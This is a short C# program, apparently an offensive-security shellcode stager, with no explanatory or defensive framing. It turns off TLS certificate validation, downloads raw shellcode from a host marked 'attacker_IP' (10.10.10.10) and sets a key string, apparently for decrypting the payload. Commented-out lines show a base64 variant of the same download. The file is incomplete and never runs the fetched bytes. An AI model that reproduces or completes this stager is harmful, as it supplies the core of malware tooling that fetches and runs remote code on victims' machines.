using System;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;

public class Program
{
  public static void Main()
  {
    string url = "https://10.10.10.10/"; //attacker_IP
    Stager(url);
  }

  public static void Stager(string url)
  {
    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);
    byte[] keyBytes = Encoding.ASCII.GetBytes("YoloSpaceHacker");

    //string sbuf = wc.DownloadString(url + "shellcode");
    //var buf = System.Convert.FromBase64String(sbuf);
  }
}